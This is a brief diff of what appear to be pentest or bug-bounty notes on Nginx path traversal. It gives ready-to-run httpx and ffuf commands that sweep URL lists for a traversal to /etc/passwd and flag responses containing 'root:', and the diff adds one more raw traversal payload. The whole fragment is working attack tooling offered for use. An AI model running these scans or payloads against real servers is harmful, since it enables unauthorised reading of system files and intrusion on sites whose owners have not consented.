@@ -3,3 +3,6 @@ Nginx Path Traversal
  commaand : httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
 
  command : ffuf -c -w urls.txt -u FUZZ////////../../../../../etc/passwd -mr "root:x"
+
+
+///////../../../etc/passwd
